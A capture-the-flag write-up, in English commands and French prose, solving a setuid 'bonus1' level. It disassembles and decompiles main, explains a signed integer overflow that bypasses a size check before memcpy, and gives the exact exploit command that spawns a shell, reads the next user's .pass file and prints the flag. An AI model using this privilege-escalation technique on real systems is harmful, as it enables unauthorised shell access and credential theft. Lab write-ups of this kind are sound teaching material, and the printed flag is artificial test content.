# bonus1

```bash
$ ls -l
total 8
-rwsr-s---+ 1 bonus2 users 5043 Mar  6  2016 bonus1
$ file bonus1
bonus1: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x5af8fd13428afc6d05de1abfa9d7e7621df174c7, not stripped
$ gdb -q ./bonus1
Reading symbols from /home/user/bonus1/bonus1...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482d4  _init
0x08048320  memcpy
0x08048320  memcpy@plt
0x08048330  __gmon_start__
0x08048330  __gmon_start__@plt
0x08048340  __libc_start_main
0x08048340  __libc_start_main@plt
0x08048350  execl
0x08048350  execl@plt
0x08048360  atoi
0x08048360  atoi@plt
0x08048370  _start
0x080483a0  __do_global_dtors_aux
0x08048400  frame_dummy
0x08048424  main
0x080484b0  __libc_csu_init
0x08048520  __libc_csu_fini
0x08048522  __i686.get_pc_thunk.bx
0x08048530  __do_global_ctors_aux
0x0804855c  _fini
(gdb) disas main
Dump of assembler code for function main:
   0x08048424 <+0>:     push   %ebp
   0x08048425 <+1>:     mov    %esp,%ebp
   0x08048427 <+3>:     and    $0xfffffff0,%esp
   0x0804842a <+6>:     sub    $0x40,%esp
   0x0804842d <+9>:     mov    0xc(%ebp),%eax
   0x08048430 <+12>:    add    $0x4,%eax
   0x08048433 <+15>:    mov    (%eax),%eax
   0x08048435 <+17>:    mov    %eax,(%esp)
   0x08048438 <+20>:    call   0x8048360 <atoi@plt>
   0x0804843d <+25>:    mov    %eax,0x3c(%esp)
   0x08048441 <+29>:    cmpl   $0x9,0x3c(%esp)
   0x08048446 <+34>:    jle    0x804844f <main+43>
   0x08048448 <+36>:    mov    $0x1,%eax
   0x0804844d <+41>:    jmp    0x80484a3 <main+127>
   0x0804844f <+43>:    mov    0x3c(%esp),%eax
   0x08048453 <+47>:    lea    0x0(,%eax,4),%ecx
   0x0804845a <+54>:    mov    0xc(%ebp),%eax
   0x0804845d <+57>:    add    $0x8,%eax
   0x08048460 <+60>:    mov    (%eax),%eax
   0x08048462 <+62>:    mov    %eax,%edx
   0x08048464 <+64>:    lea    0x14(%esp),%eax
   0x08048468 <+68>:    mov    %ecx,0x8(%esp)
   0x0804846c <+72>:    mov    %edx,0x4(%esp)
   0x08048470 <+76>:    mov    %eax,(%esp)
   0x08048473 <+79>:    call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:    cmpl   $0x574f4c46,0x3c(%esp)
   0x08048480 <+92>:    jne    0x804849e <main+122>
   0x08048482 <+94>:    movl   $0x0,0x8(%esp)
   0x0804848a <+102>:   movl   $0x8048580,0x4(%esp)
   0x08048492 <+110>:   movl   $0x8048583,(%esp)
   0x08048499 <+117>:   call   0x8048350 <execl@plt>
   0x0804849e <+122>:   mov    $0x0,%eax
   0x080484a3 <+127>:   leave
   0x080484a4 <+128>:   ret
End of assembler dump.
```

```bash
# Decompile main
undefined4 main(undefined4 param_1,int param_2)
{
  undefined4 uVar1;
  undefined local_3c [40];
  int local_14;

  local_14 = atoi(*(char **)(param_2 + 4));
  if (local_14 < 10) {
    memcpy(local_3c,*(void **)(param_2 + 8),local_14 * 4);
    if (local_14 == 0x574f4c46) {
      execl("/bin/sh","sh",0);
    }
    uVar1 = 0;
  }
  else {
    uVar1 = 1;
  }
  return uVar1;
}
```

Le débordement est contrôlé par la taille de `local_14 * 4`. La plage entre `-2147483592` et `-2147483637` fonctionne car elle permet :

- D'écraser la mémoire après `local_3c` sans dépasser trop loin dans la pile.
- De modifier précisément la variable `local_14` en écrasant la bonne zone de la pile avec la valeur `0x574f4c46`, ce qui déclenche l'exécution du shell

`"A" * 40` pour remplir entièrement le buffer local_3c, puis ont écrase la stack avec l’adresse `"\x46\x4C\x4F\x57"`

```bash
$ ./bonus1 -2147483637 $(python -c 'print "A" * 40 + "\x46\x4C\x4F\x57"')
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

FLAG: `579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245`
